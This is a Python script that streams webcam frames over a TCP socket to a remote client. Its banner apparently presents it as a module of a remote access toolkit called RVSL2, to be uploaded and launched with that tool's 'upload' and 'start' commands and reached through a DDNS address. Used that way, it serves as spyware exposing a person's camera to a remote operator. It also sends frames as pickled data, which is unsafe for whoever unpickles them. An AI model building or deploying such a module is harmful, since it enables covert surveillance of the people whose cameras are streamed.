import socket
import cv2
import numpy as np
import pickle
import struct
import os
import time
from colorama import Fore

def create_socket_server(host_ip, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_address = (host_ip, port)
    server_socket.bind(socket_address)
    server_socket.listen(5)
    return server_socket

host_name = socket.gethostname()
port = 7282
host_ip = input("(d)DNS/IP : ")
print('Infos //// IP/(d)DNS >', host_ip, 'PORT >', port, ' (7282 default)')

print(Fore.YELLOW + """
Upload the client via <upload> function of RVSL2 then launch it with <start> function.
Don't forget to modify the DDNS PORT if necessary!
""" + Fore.WHITE)

server_socket = create_socket_server(host_ip, port)
print("[*] Waiting for incoming connections...")

user_name = os.getlogin()
window_title = f"{host_name} - {user_name}"

cap = cv2.VideoCapture(0)

fps = 60
delay = 1 / fps
font = cv2.FONT_HERSHEY_SIMPLEX

while True:
    client_socket, addr = server_socket.accept()
    print('GOT CONNECTION FROM:', addr)
    if client_socket:
        last_time = time.time()
        while cap.isOpened():
            current_time = time.time()
            if current_time - last_time >= delay:
                ret, frame = cap.read()

                # Calculer les FPS en temps réel
                fps_real = int(1 / (current_time - last_time))

                # Afficher les FPS en temps réel en haut à gauche
                cv2.putText(frame, f"FPS: {fps_real}", (10, 30), font, 0.5, (0, 255, 0), 2, cv2.LINE_AA)

                a = pickle.dumps(frame)
                message = struct.pack("Q", len(a)) + a
                client_socket.sendall(message)
                cv2.imshow(window_title, frame)
                key = cv2.waitKey(1) & 0xFF
                if key == ord('q'):
                    client_socket.close()
                    break
                last_time = current_time

cap.release()
cv2.destroyAllWindows()
